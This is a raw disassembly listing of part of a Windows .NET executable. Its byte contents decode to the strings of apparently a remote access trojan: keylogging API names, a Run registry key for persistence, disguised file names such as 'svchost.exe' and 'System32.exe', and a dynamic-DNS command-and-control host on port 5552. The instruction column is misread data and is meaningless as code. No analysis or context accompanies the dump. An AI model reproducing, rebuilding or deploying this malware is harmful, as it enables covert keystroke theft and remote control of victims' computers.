  409026:	6e                   	outsb  %ds:(%esi),(%dx)
  409027:	70 75                	jo     0x40909e
  409029:	74 00                	je     0x40902b
  40902b:	66 42                	inc    %dx
  40902d:	6c                   	insb   (%dx),%es:(%edi)
  40902e:	6f                   	outsl  %ds:(%esi),(%dx)
  40902f:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  409032:	53                   	push   %ebx
  409033:	77 61                	ja     0x409096
  409035:	70 4d                	jo     0x409084
  409037:	6f                   	outsl  %ds:(%esi),(%dx)
  409038:	75 73                	jne    0x4090ad
  40903a:	65 42                	gs inc %edx
  40903c:	75 74                	jne    0x4090b2
  40903e:	74 6f                	je     0x4090af
  409040:	6e                   	outsb  %ds:(%esi),(%dx)
  409041:	00 62 53             	add    %ah,0x53(%edx)
  409044:	77 61                	ja     0x4090a7
  409046:	70 00                	jo     0x409048
  409048:	53                   	push   %ebx
  409049:	65 6e                	outsb  %gs:(%esi),(%dx)
  40904b:	64 4d                	fs dec %ebp
  40904d:	65 73 73             	gs jae 0x4090c3
  409050:	61                   	popa
  409051:	67 65 00 6d 73       	add    %ch,%gs:0x73(%di)
  409056:	67 00 77 50          	add    %dh,0x50(%bx)
  40905a:	61                   	popa
  40905b:	72 61                	jb     0x4090be
  40905d:	6d                   	insl   (%dx),%es:(%edi)
  40905e:	00 6c 70 61          	add    %ch,0x61(%eax,%esi,2)
  409062:	72 61                	jb     0x4090c5
  409064:	6d                   	insl   (%dx),%es:(%edi)
  409065:	00 53 65             	add    %dl,0x65(%ebx)
  409068:	74 57                	je     0x4090c1
  40906a:	69 6e 64 6f 77 50 6f 	imul   $0x6f50776f,0x64(%esi),%ebp
  409071:	73 00                	jae    0x409073
  409073:	68 57 6e 64 49       	push   $0x49646e57
  409078:	6e                   	outsb  %ds:(%esi),(%dx)
  409079:	73 65                	jae    0x4090e0
  40907b:	72 74                	jb     0x4090f1
  40907d:	41                   	inc    %ecx
  40907e:	66 74 65             	data16 je 0x4090e6
  409081:	72 00                	jb     0x409083
  409083:	78 00                	js     0x409085
  409085:	79 00                	jns    0x409087
  409087:	63 78 00             	arpl   %edi,0x0(%eax)
  40908a:	63 79 00             	arpl   %edi,0x0(%ecx)
  40908d:	77 46                	ja     0x4090d5
  40908f:	6c                   	insb   (%dx),%es:(%edi)
  409090:	61                   	popa
  409091:	67 73 00             	addr16 jae 0x409094
  409094:	6d                   	insl   (%dx),%es:(%edi)
  409095:	63 69 53             	arpl   %ebp,0x53(%ecx)
  409098:	65 6e                	outsb  %gs:(%esi),(%dx)
  40909a:	64 53                	fs push %ebx
  40909c:	74 72                	je     0x409110
  40909e:	69 6e 67 00 6d 63 69 	imul   $0x69636d00,0x67(%esi),%ebp
  4090a5:	53                   	push   %ebx
  4090a6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090a8:	64 53                	fs push %ebx
  4090aa:	74 72                	je     0x40911e
  4090ac:	69 6e 67 41 00 6c 70 	imul   $0x706c0041,0x67(%esi),%ebp
  4090b3:	43                   	inc    %ebx
  4090b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4090b5:	6d                   	insl   (%dx),%es:(%edi)
  4090b6:	6d                   	insl   (%dx),%es:(%edi)
  4090b7:	61                   	popa
  4090b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4090b9:	64 53                	fs push %ebx
  4090bb:	74 72                	je     0x40912f
  4090bd:	69 6e 67 00 6c 70 52 	imul   $0x52706c00,0x67(%esi),%ebp
  4090c4:	65 74 75             	gs je  0x40913c
  4090c7:	72 6e                	jb     0x409137
  4090c9:	53                   	push   %ebx
  4090ca:	74 72                	je     0x40913e
  4090cc:	69 6e 67 00 75 52 65 	imul   $0x65527500,0x67(%esi),%ebp
  4090d3:	74 75                	je     0x40914a
  4090d5:	72 6e                	jb     0x409145
  4090d7:	4c                   	dec    %esp
  4090d8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090da:	67 74 68             	addr16 je 0x409145
  4090dd:	00 68 77             	add    %ch,0x77(%eax)
  4090e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e1:	64 43                	fs inc %ebx
  4090e3:	61                   	popa
  4090e4:	6c                   	insb   (%dx),%es:(%edi)
  4090e5:	6c                   	insb   (%dx),%es:(%edi)
  4090e6:	62 61 63             	bound  %esp,0x63(%ecx)
  4090e9:	6b 00 42             	imul   $0x42,(%eax),%eax
  4090ec:	65 65 70 00          	gs gs jo 0x4090f0
  4090f0:	66 72 65             	data16 jb 0x409158
  4090f3:	71 00                	jno    0x4090f5
  4090f5:	64 75 72             	fs jne 0x40916a
  4090f8:	00 41 64             	add    %al,0x64(%ecx)
  4090fb:	64 48                	fs dec %eax
  4090fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4090fe:	6d                   	insl   (%dx),%es:(%edi)
  4090ff:	65 00 74 65 78       	add    %dh,%gs:0x78(%ebp,%eiz,2)
  409104:	74 00                	je     0x409106
  409106:	49                   	dec    %ecx
  409107:	6e                   	outsb  %ds:(%esi),(%dx)
  409108:	64 00 69 6e          	add    %ch,%fs:0x6e(%ecx)
  40910c:	66 00 49 4e          	data16 add %cl,0x4e(%ecx)
  409110:	53                   	push   %ebx
  409111:	00 6b 6f             	add    %ch,0x6f(%ebx)
  409114:	00 6d 64             	add    %ch,0x64(%ebp)
  409117:	35 00 4e 74 53       	xor    $0x53744e00,%eax
  40911c:	65 74 49             	gs je  0x409168
  40911f:	6e                   	outsb  %ds:(%esi),(%dx)
  409120:	66 6f                	outsw  %ds:(%esi),(%dx)
  409122:	72 6d                	jb     0x409191
  409124:	61                   	popa
  409125:	74 69                	je     0x409190
  409127:	6f                   	outsl  %ds:(%esi),(%dx)
  409128:	6e                   	outsb  %ds:(%esi),(%dx)
  409129:	50                   	push   %eax
  40912a:	72 6f                	jb     0x40919b
  40912c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40912f:	73 00                	jae    0x409131
  409131:	68 50 72 6f 63       	push   $0x636f7250
  409136:	65 73 73             	gs jae 0x4091ac
  409139:	00 70 72             	add    %dh,0x72(%eax)
  40913c:	6f                   	outsl  %ds:(%esi),(%dx)
  40913d:	63 65 73             	arpl   %esp,0x73(%ebp)
  409140:	73 49                	jae    0x40918b
  409142:	6e                   	outsb  %ds:(%esi),(%dx)
  409143:	66 6f                	outsw  %ds:(%esi),(%dx)
  409145:	72 6d                	jb     0x4091b4
  409147:	61                   	popa
  409148:	74 69                	je     0x4091b3
  40914a:	6f                   	outsl  %ds:(%esi),(%dx)
  40914b:	6e                   	outsb  %ds:(%esi),(%dx)
  40914c:	43                   	inc    %ebx
  40914d:	6c                   	insb   (%dx),%es:(%edi)
  40914e:	61                   	popa
  40914f:	73 73                	jae    0x4091c4
  409151:	00 70 72             	add    %dh,0x72(%eax)
  409154:	6f                   	outsl  %ds:(%esi),(%dx)
  409155:	63 65 73             	arpl   %esp,0x73(%ebp)
  409158:	73 49                	jae    0x4091a3
  40915a:	6e                   	outsb  %ds:(%esi),(%dx)
  40915b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40915d:	72 6d                	jb     0x4091cc
  40915f:	61                   	popa
  409160:	74 69                	je     0x4091cb
  409162:	6f                   	outsl  %ds:(%esi),(%dx)
  409163:	6e                   	outsb  %ds:(%esi),(%dx)
  409164:	00 70 72             	add    %dh,0x72(%eax)
  409167:	6f                   	outsl  %ds:(%esi),(%dx)
  409168:	63 65 73             	arpl   %esp,0x73(%ebp)
  40916b:	73 49                	jae    0x4091b6
  40916d:	6e                   	outsb  %ds:(%esi),(%dx)
  40916e:	66 6f                	outsw  %ds:(%esi),(%dx)
  409170:	72 6d                	jb     0x4091df
  409172:	61                   	popa
  409173:	74 69                	je     0x4091de
  409175:	6f                   	outsl  %ds:(%esi),(%dx)
  409176:	6e                   	outsb  %ds:(%esi),(%dx)
  409177:	4c                   	dec    %esp
  409178:	65 6e                	outsb  %gs:(%esi),(%dx)
  40917a:	67 74 68             	addr16 je 0x4091e5
  40917d:	00 50 6c             	add    %dl,0x6c(%eax)
  409180:	75 67                	jne    0x4091e9
  409182:	69 6e 00 63 00 70 72 	imul   $0x72700063,0x0(%esi),%ebp
  409189:	00 69 00             	add    %ch,0x0(%ecx)
  40918c:	52                   	push   %edx
  40918d:	43                   	inc    %ebx
  40918e:	00 53 42             	add    %dl,0x42(%ebx)
  409191:	00 53 00             	add    %dl,0x0(%ebx)
  409194:	53                   	push   %ebx
  409195:	65 6e                	outsb  %gs:(%esi),(%dx)
  409197:	64 62 00             	bound  %eax,%fs:(%eax)
  40919a:	53                   	push   %ebx
  40919b:	54                   	push   %esp
  40919c:	56                   	push   %esi
  40919d:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  4091a1:	79 70                	jns    0x409213
  4091a3:	00 55 4e             	add    %dl,0x4e(%ebp)
  4091a6:	53                   	push   %ebx
  4091a7:	00 5a 49             	add    %bl,0x49(%edx)
  4091aa:	50                   	push   %eax
  4091ab:	00 4c 61 73          	add    %cl,0x73(%ecx,%eiz,2)
  4091af:	74 41                	je     0x4091f2
  4091b1:	53                   	push   %ebx
  4091b2:	00 4c 61 73          	add    %cl,0x73(%ecx,%eiz,2)
  4091b6:	74 41                	je     0x4091f9
  4091b8:	56                   	push   %esi
  4091b9:	00 6c 61 73          	add    %ch,0x73(%ecx,%eiz,2)
  4091bd:	74 4b                	je     0x40920a
  4091bf:	65 79 00             	gs jns 0x4091c2
  4091c2:	4c                   	dec    %esp
  4091c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c4:	67 73 00             	addr16 jae 0x4091c7
  4091c7:	76 6e                	jbe    0x409237
  4091c9:	00 41 56             	add    %al,0x56(%ecx)
  4091cc:	00 46 69             	add    %al,0x69(%esi)
  4091cf:	78 00                	js     0x4091d1
  4091d1:	6b 00 47             	imul   $0x47,(%eax),%eax
  4091d4:	65 74 41             	gs je  0x409218
  4091d7:	73 79                	jae    0x409252
  4091d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4091da:	63 4b 65             	arpl   %ecx,0x65(%ebx)
  4091dd:	79 53                	jns    0x409232
  4091df:	74 61                	je     0x409242
  4091e1:	74 65                	je     0x409248
  4091e3:	00 61 00             	add    %ah,0x0(%ecx)
  4091e6:	47                   	inc    %edi
  4091e7:	65 74 4b             	gs je  0x409235
  4091ea:	65 79 62             	gs jns 0x40924f
  4091ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4091ee:	61                   	popa
  4091ef:	72 64                	jb     0x409255
  4091f1:	4c                   	dec    %esp
  4091f2:	61                   	popa
  4091f3:	79 6f                	jns    0x409264
  4091f5:	75 74                	jne    0x40926b
  4091f7:	00 47 65             	add    %al,0x65(%edi)
  4091fa:	74 4b                	je     0x409247
  4091fc:	65 79 62             	gs jns 0x409261
  4091ff:	6f                   	outsl  %ds:(%esi),(%dx)
  409200:	61                   	popa
  409201:	72 64                	jb     0x409267
  409203:	53                   	push   %ebx
  409204:	74 61                	je     0x409267
  409206:	74 65                	je     0x40926d
  409208:	00 47 65             	add    %al,0x65(%edi)
  40920b:	74 57                	je     0x409264
  40920d:	69 6e 64 6f 77 54 68 	imul   $0x6854776f,0x64(%esi),%ebp
  409214:	72 65                	jb     0x40927b
  409216:	61                   	popa
  409217:	64 50                	fs push %eax
  409219:	72 6f                	jb     0x40928a
  40921b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40921e:	73 49                	jae    0x409269
  409220:	64 00 4d 61          	add    %cl,%fs:0x61(%ebp)
  409224:	70 56                	jo     0x40927c
  409226:	69 72 74 75 61 6c 4b 	imul   $0x4b6c6175,0x74(%edx),%esi
  40922d:	65 79 00             	gs jns 0x409230
  409230:	54                   	push   %esp
  409231:	6f                   	outsl  %ds:(%esi),(%dx)
  409232:	55                   	push   %ebp
  409233:	6e                   	outsb  %ds:(%esi),(%dx)
  409234:	69 63 6f 64 65 45 78 	imul   $0x78456564,0x6f(%ebx),%esp
  40923b:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40923f:	00 66 00             	add    %ah,0x0(%esi)
  409242:	67 00 56 4b          	add    %dl,0x4b(%bp)
  409246:	43                   	inc    %ebx
  409247:	6f                   	outsl  %ds:(%esi),(%dx)
  409248:	64 65 54             	fs gs push %esp
  40924b:	6f                   	outsl  %ds:(%esi),(%dx)
  40924c:	55                   	push   %ebp
  40924d:	6e                   	outsb  %ds:(%esi),(%dx)
  40924e:	69 63 6f 64 65 00 57 	imul   $0x57006564,0x6f(%ebx),%esp
  409255:	52                   	push   %edx
  409256:	4b                   	dec    %ebx
  409257:	00 43 4c             	add    %al,0x4c(%ebx)
  40925a:	44                   	inc    %esp
  40925b:	00 45 6e             	add    %al,0x6e(%ebp)
  40925e:	61                   	popa
  40925f:	62 6c 65 57          	bound  %ebp,0x57(%ebp,%eiz,2)
  409263:	69 6e 64 6f 77 00 62 	imul   $0x6200776f,0x64(%esi),%ebp
  40926a:	45                   	inc    %ebp
  40926b:	6e                   	outsb  %ds:(%esi),(%dx)
  40926c:	61                   	popa
  40926d:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  409271:	6c                   	insb   (%dx),%es:(%edi)
  409272:	70 64                	jo     0x4092d8
  409274:	77 50                	ja     0x4092c6
  409276:	72 6f                	jb     0x4092e7
  409278:	63 65 73             	arpl   %esp,0x73(%ebp)
  40927b:	73 49                	jae    0x4092c6
  40927d:	44                   	inc    %esp
  40927e:	00 47 65             	add    %al,0x65(%edi)
  409281:	74 43                	je     0x4092c6
  409283:	6c                   	insb   (%dx),%es:(%edi)
  409284:	61                   	popa
  409285:	73 73                	jae    0x4092fa
  409287:	4e                   	dec    %esi
  409288:	61                   	popa
  409289:	6d                   	insl   (%dx),%es:(%edi)
  40928a:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40928e:	74 43                	je     0x4092d3
  409290:	6c                   	insb   (%dx),%es:(%edi)
  409291:	61                   	popa
  409292:	73 73                	jae    0x409307
  409294:	4e                   	dec    %esi
  409295:	61                   	popa
  409296:	6d                   	insl   (%dx),%es:(%edi)
  409297:	65 41                	gs inc %ecx
  409299:	00 6c 70 43          	add    %ch,0x43(%eax,%esi,2)
  40929d:	6c                   	insb   (%dx),%es:(%edi)
  40929e:	61                   	popa
  40929f:	73 73                	jae    0x409314
  4092a1:	4e                   	dec    %esi
  4092a2:	61                   	popa
  4092a3:	6d                   	insl   (%dx),%es:(%edi)
  4092a4:	65 00 6e 4d          	add    %ch,%gs:0x4d(%esi)
  4092a8:	61                   	popa
  4092a9:	78 43                	js     0x4092ee
  4092ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4092ac:	75 6e                	jne    0x40931c
  4092ae:	74 00                	je     0x4092b0
  4092b0:	53                   	push   %ebx
  4092b1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092b3:	64 4d                	fs dec %ebp
  4092b5:	65 73 73             	gs jae 0x40932b
  4092b8:	61                   	popa
  4092b9:	67 65 41             	addr16 gs inc %ecx
  4092bc:	00 77 4d             	add    %dh,0x4d(%edi)
  4092bf:	73 67                	jae    0x409328
  4092c1:	00 6c 50 61          	add    %ch,0x61(%eax,%edx,2)
  4092c5:	72 61                	jb     0x409328
  4092c7:	6d                   	insl   (%dx),%es:(%edi)
  4092c8:	00 6c 70 53          	add    %ch,0x53(%eax,%esi,2)
  4092cc:	74 72                	je     0x409340
  4092ce:	69 6e 67 00 63 63 68 	imul   $0x68636300,0x67(%esi),%ebp
  4092d5:	00 45 6e             	add    %al,0x6e(%ebp)
  4092d8:	75 6d                	jne    0x409347
  4092da:	43                   	inc    %ebx
  4092db:	68 69 6c 64 57       	push   $0x57646c69
  4092e0:	69 6e 64 6f 77 73 00 	imul   $0x73776f,0x64(%esi),%ebp
  4092e7:	6c                   	insb   (%dx),%es:(%edi)
  4092e8:	70 45                	jo     0x40932f
  4092ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4092eb:	75 6d                	jne    0x40935a
  4092ed:	46                   	inc    %esi
  4092ee:	75 6e                	jne    0x40935e
  4092f0:	63 00                	arpl   %eax,(%eax)
  4092f2:	45                   	inc    %ebp
  4092f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f4:	75 6d                	jne    0x409363
  4092f6:	43                   	inc    %ebx
  4092f7:	68 69 6c 64 00       	push   $0x646c69
  4092fc:	70 72                	jo     0x409370
  4092fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4092ff:	74 65                	je     0x409366
  409301:	63 74 00 47          	arpl   %esi,0x47(%eax,%eax,1)
  409305:	65 74 43             	gs je  0x40934b
  409308:	68 69 6c 64 00       	push   $0x646c69
  40930d:	68 77 64 00 54       	push   $0x54006477
  409312:	61                   	popa
  409313:	72 67                	jb     0x40937c
  409315:	65 74 4f             	gs je  0x409367
  409318:	62 6a 65             	bound  %ebp,0x65(%edx)
  40931b:	63 74 00 54          	arpl   %esi,0x54(%eax,%eax,1)
  40931f:	61                   	popa
  409320:	72 67                	jb     0x409389
  409322:	65 74 4d             	gs je  0x409372
  409325:	65 74 68             	gs je  0x409390
  409328:	6f                   	outsl  %ds:(%esi),(%dx)
  409329:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  40932d:	67 69 6e 49 6e 76 6f 	imul   $0x6b6f766e,0x49(%bp),%ebp
  409334:	6b 
  409335:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  40933a:	65 67 61             	gs addr16 popa
  40933d:	74 65                	je     0x4093a4
  40933f:	43                   	inc    %ebx
  409340:	61                   	popa
  409341:	6c                   	insb   (%dx),%es:(%edi)
  409342:	6c                   	insb   (%dx),%es:(%edi)
  409343:	62 61 63             	bound  %esp,0x63(%ecx)
  409346:	6b 00 44             	imul   $0x44,(%eax),%eax
  409349:	65 6c                	gs insb (%dx),%es:(%edi)
  40934b:	65 67 61             	gs addr16 popa
  40934e:	74 65                	je     0x4093b5
  409350:	41                   	inc    %ecx
  409351:	73 79                	jae    0x4093cc
  409353:	6e                   	outsb  %ds:(%esi),(%dx)
  409354:	63 53 74             	arpl   %edx,0x74(%ebx)
  409357:	61                   	popa
  409358:	74 65                	je     0x4093bf
  40935a:	00 45 6e             	add    %al,0x6e(%ebp)
  40935d:	64 49                	fs dec %ecx
  40935f:	6e                   	outsb  %ds:(%esi),(%dx)
  409360:	76 6f                	jbe    0x4093d1
  409362:	6b 65 00 44          	imul   $0x44,0x0(%ebp),%esp
  409366:	65 6c                	gs insb (%dx),%es:(%edi)
  409368:	65 67 61             	gs addr16 popa
  40936b:	74 65                	je     0x4093d2
  40936d:	41                   	inc    %ecx
  40936e:	73 79                	jae    0x4093e9
  409370:	6e                   	outsb  %ds:(%esi),(%dx)
  409371:	63 52 65             	arpl   %edx,0x65(%edx)
  409374:	73 75                	jae    0x4093eb
  409376:	6c                   	insb   (%dx),%es:(%edi)
  409377:	74 00                	je     0x409379
  409379:	49                   	dec    %ecx
  40937a:	6e                   	outsb  %ds:(%esi),(%dx)
  40937b:	76 6f                	jbe    0x4093ec
  40937d:	6b 65 00 57          	imul   $0x57,0x0(%ebp),%esp
  409381:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  409385:	72 76                	jb     0x4093fd
  409387:	69 63 65 73 00 47 65 	imul   $0x65470073,0x65(%ebx),%esp
  40938e:	74 49                	je     0x4093d9
  409390:	6e                   	outsb  %ds:(%esi),(%dx)
  409391:	73 74                	jae    0x409407
  409393:	61                   	popa
  409394:	6e                   	outsb  %ds:(%esi),(%dx)
  409395:	63 65 00             	arpl   %esp,0x0(%ebp)
  409398:	00 09                	add    %cl,(%ecx)
  40939a:	54                   	push   %esp
  40939b:	00 72 00             	add    %dh,0x0(%edx)
  40939e:	75 00                	jne    0x4093a0
  4093a0:	65 00 00             	add    %al,%gs:(%eax)
  4093a3:	17                   	pop    %ss
  4093a4:	55                   	push   %ebp
  4093a5:	00 73 00             	add    %dh,0x0(%ebx)
  4093a8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4093ac:	50                   	push   %eax
  4093ad:	00 72 00             	add    %dh,0x0(%edx)
  4093b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4093b1:	00 66 00             	add    %ah,0x0(%esi)
  4093b4:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4093ba:	00 15 73 00 65 00    	add    %dl,0x650073
  4093c0:	72 00                	jb     0x4093c2
  4093c2:	76 00                	jbe    0x4093c4
  4093c4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4093c8:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4093cc:	78 00                	js     0x4093ce
  4093ce:	65 00 00             	add    %al,%gs:(%eax)
  4093d1:	2f                   	das
  4093d2:	73 00                	jae    0x4093d4
  4093d4:	75 00                	jne    0x4093d6
  4093d6:	73 00                	jae    0x4093d8
  4093d8:	69 00 61 00 68 00    	imul   $0x680061,(%eax),%eax
  4093de:	61                   	popa
  4093df:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  4093e3:	00 34 00             	add    %dh,(%eax,%eax,1)
  4093e6:	31 00                	xor    %eax,(%eax)
  4093e8:	39 00                	cmp    %eax,(%eax)
  4093ea:	39 00                	cmp    %eax,(%eax)
  4093ec:	61                   	popa
  4093ed:	00 2e                	add    %ch,(%esi)
  4093ef:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  4093f3:	00 6e 00             	add    %ch,0x0(%esi)
  4093f6:	73 00                	jae    0x4093f8
  4093f8:	2e 00 6e 00          	add    %ch,%cs:0x0(%esi)
  4093fc:	65 00 74 00 00       	add    %dh,%gs:0x0(%eax,%eax,1)
  409401:	01 00                	add    %eax,(%eax)
  409403:	09 35 00 35 00 35    	or     %esi,0x35003500
  409409:	00 32                	add    %dh,(%edx)
  40940b:	00 00                	add    %al,(%eax)
  40940d:	41                   	inc    %ecx
  40940e:	62 00                	bound  %eax,(%eax)
  409410:	39 00                	cmp    %eax,(%eax)
  409412:	34 00                	xor    $0x0,%al
  409414:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  409418:	39 00                	cmp    %eax,(%eax)
  40941a:	35 00 33 00 34       	xor    $0x34003300,%eax
  40941f:	00 33                	add    %dh,(%ebx)
  409421:	00 64 00 38          	add    %ah,0x38(%eax,%eax,1)
  409425:	00 35 00 62 00 62    	add    %dh,0x62006200
  40942b:	00 31                	add    %dh,(%ecx)
  40942d:	00 38                	add    %bh,(%eax)
  40942f:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  409433:	00 35 00 30 00 64    	add    %dh,0x64003000
  409439:	00 30                	add    %dh,(%eax)
  40943b:	00 39                	add    %bh,(%ecx)
  40943d:	00 39                	add    %bh,(%ecx)
  40943f:	00 61 00             	add    %ah,0x0(%ecx)
  409442:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  409446:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40944a:	37                   	aaa
  40944b:	00 33                	add    %dh,(%ebx)
  40944d:	00 00                	add    %al,(%eax)
  40944f:	5b                   	pop    %ebx
  409450:	53                   	push   %ebx
  409451:	00 6f 00             	add    %ch,0x0(%edi)
  409454:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  409459:	00 61 00             	add    %ah,0x0(%ecx)
  40945c:	72 00                	jb     0x40945e
  40945e:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  409463:	00 69 00             	add    %ch,0x0(%ecx)
  409466:	63 00                	arpl   %eax,(%eax)
  409468:	72 00                	jb     0x40946a
  40946a:	6f                   	outsl  %ds:(%esi),(%dx)
  40946b:	00 73 00             	add    %dh,0x0(%ebx)
  40946e:	6f                   	outsl  %ds:(%esi),(%dx)
  40946f:	00 66 00             	add    %ah,0x0(%esi)
  409472:	74 00                	je     0x409474
  409474:	5c                   	pop    %esp
  409475:	00 57 00             	add    %dl,0x0(%edi)
  409478:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40947e:	6f                   	outsl  %ds:(%esi),(%dx)
  40947f:	00 77 00             	add    %dh,0x0(%edi)
  409482:	73 00                	jae    0x409484
  409484:	5c                   	pop    %esp
  409485:	00 43 00             	add    %al,0x0(%ebx)
  409488:	75 00                	jne    0x40948a
  40948a:	72 00                	jb     0x40948c
  40948c:	72 00                	jb     0x40948e
  40948e:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409492:	74 00                	je     0x409494
  409494:	56                   	push   %esi
  409495:	00 65 00             	add    %ah,0x0(%ebp)
  409498:	72 00                	jb     0x40949a
  40949a:	73 00                	jae    0x40949c
  40949c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4094a2:	5c                   	pop    %esp
  4094a3:	00 52 00             	add    %dl,0x0(%edx)
  4094a6:	75 00                	jne    0x4094a8
  4094a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4094a9:	00 00                	add    %al,(%eax)
  4094ab:	05 32 00 30 00       	add    $0x300032,%eax
  4094b0:	00 11                	add    %dl,(%ecx)
  4094b2:	53                   	push   %ebx
  4094b3:	00 47 00             	add    %al,0x0(%edi)
  4094b6:	46                   	inc    %esi
  4094b7:	00 6a 00             	add    %ch,0x0(%edx)
  4094ba:	53                   	push   %ebx
  4094bb:	00 32                	add    %dh,(%edx)
  4094bd:	00 56 00             	add    %dl,0x0(%esi)
  4094c0:	6b 00 00             	imul   $0x0,(%eax),%eax
  4094c3:	0b 69 00             	or     0x0(%ecx),%ebp
  4094c6:	6d                   	insl   (%dx),%es:(%edi)
  4094c7:	00 35 00 32 00 33    	add    %dh,0x33003200
  4094cd:	00 00                	add    %al,(%eax)
  4094cf:	0b 7c 00 27          	or     0x27(%eax,%eax,1),%edi
  4094d3:	00 7c 00 27          	add    %bh,0x27(%eax,%eax,1)
  4094d7:	00 7c 00 01          	add    %bh,0x1(%eax,%eax,1)
  4094db:	19 53 00             	sbb    %edx,0x0(%ebx)
  4094de:	79 00                	jns    0x4094e0
  4094e0:	73 00                	jae    0x4094e2
  4094e2:	74 00                	je     0x4094e4
  4094e4:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4094e8:	33 00                	xor    (%eax),%eax
  4094ea:	32 00                	xor    (%eax),%al
  4094ec:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4094f0:	78 00                	js     0x4094f2
  4094f2:	65 00 00             	add    %al,%gs:(%eax)
  4094f5:	17                   	pop    %ss
  4094f6:	73 00                	jae    0x4094f8
  4094f8:	76 00                	jbe    0x4094fa
  4094fa:	63 00                	arpl   %eax,(%eax)
  4094fc:	68 00 6f 00 73       	push   $0x73006f00
  409501:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  409505:	00 65 00             	add    %ah,0x0(%ebp)
  409508:	78 00                	js     0x40950a
  40950a:	65 00 00             	add    %al,%gs:(%eax)
  40950d:	0f 43 00             	cmovae (%eax),%eax
  409510:	6f                   	outsl  %ds:(%esi),(%dx)
  409511:	00 6e 00             	add    %ch,0x0(%esi)
  409514:	6e                   	outsb  %ds:(%esi),(%dx)
  409515:	00 65 00             	add    %ah,0x0(%ebp)
  409518:	63 00                	arpl   %eax,(%eax)
  40951a:	74 00                	je     0x40951c
  40951c:	00 05 76 00 6e 00    	add    %al,0x6e0076
  409522:	00 05 0d 00 0a 00    	add    %al,0xa000d
  409528:	00 03                	add    %al,(%ebx)
  40952a:	3a 00                	cmp    (%eax),%al
  40952c:	00 07                	add    %al,(%edi)
  40952e:	69 00 6e 00 66 00    	imul   $0x66006e,(%eax),%eax
  409534:	00 13                	add    %dl,(%ebx)
  409536:	53                   	push   %ebx
  409537:	00 6f 00             	add    %ch,0x0(%edi)
  40953a:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40953f:	00 61 00             	add    %ah,0x0(%ecx)
  409542:	72 00                	jb     0x409544
  409544:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  409549:	17                   	pop    %ss
  40954a:	53                   	push   %ebx
  40954b:	00 79 00             	add    %bh,0x0(%ecx)
  40954e:	73 00                	jae    0x409550
  409550:	74 00                	je     0x409552
  409552:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409556:	44                   	inc    %esp
  409557:	00 72 00             	add    %dh,0x0(%edx)
  40955a:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  409560:	00 03                	add    %al,(%ebx)
  409562:	5c                   	pop    %esp
  409563:	00 00                	add    %al,(%eax)
  409565:	07                   	pop    %es
  409566:	45                   	inc    %ebp
  409567:	00 52 00             	add    %dl,0x0(%edx)
  40956a:	52                   	push   %edx
  40956b:	00 00                	add    %al,(%eax)
  40956d:	03 2c 00             	add    (%eax,%eax,1),%ebp
  409570:	00 53 53             	add    %dl,0x53(%ebx)
  409573:	00 6f 00             	add    %ch,0x0(%edi)
  409576:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40957b:	00 61 00             	add    %ah,0x0(%ecx)
  40957e:	72 00                	jb     0x409580
  409580:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  409585:	00 69 00             	add    %ch,0x0(%ecx)
  409588:	63 00                	arpl   %eax,(%eax)
  40958a:	72 00                	jb     0x40958c
  40958c:	6f                   	outsl  %ds:(%esi),(%dx)
  40958d:	00 73 00             	add    %dh,0x0(%ebx)
  409590:	6f                   	outsl  %ds:(%esi),(%dx)
  409591:	00 66 00             	add    %ah,0x0(%esi)
  409594:	74 00                	je     0x409596
  409596:	5c                   	pop    %esp
  409597:	00 49 00             	add    %cl,0x0(%ecx)
  40959a:	6e                   	outsb  %ds:(%esi),(%dx)
  40959b:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
